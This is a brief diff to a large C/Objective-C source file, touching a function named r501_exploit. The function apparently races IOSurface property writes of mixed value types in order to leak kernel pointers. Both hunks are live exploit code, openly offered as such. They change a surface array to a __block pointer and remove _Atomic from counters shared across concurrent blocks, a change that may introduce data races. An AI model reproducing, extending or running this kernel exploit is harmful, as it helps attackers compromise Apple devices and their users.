@@ -28330,7 +28330,7 @@ static void r501_exploit(void) {
     #define P1_NSURFACES 8
 
     IOSurfaceRef p1_surfs_arr[P1_NSURFACES];
-    IOSurfaceRef *p1_surfs = p1_surfs_arr;
+    __block IOSurfaceRef *p1_surfs = p1_surfs_arr;
     for (int i = 0; i < P1_NSURFACES; i++) {
         p1_surfs[i] = IOSurfaceCreate(p1_props);
         if (!p1_surfs[i]) { rlog("  WARN: surf %d failed\n", i); }
@@ -28419,8 +28419,8 @@ static void r501_exploit(void) {
 
     /* Phase 1b: Race with different value types (dict vs data vs string) */
     rlog("\n  Phase 1b: Mixed-type property race\n");
-    __block _Atomic int p1b_type_mismatch = 0;
-    __block _Atomic int p1b_kptrs = 0;
+    __block int p1b_type_mismatch = 0;
+    __block int p1b_kptrs = 0;
     __block volatile int p1b_go = 0;
     __block volatile int p1b_stop = 0;
 
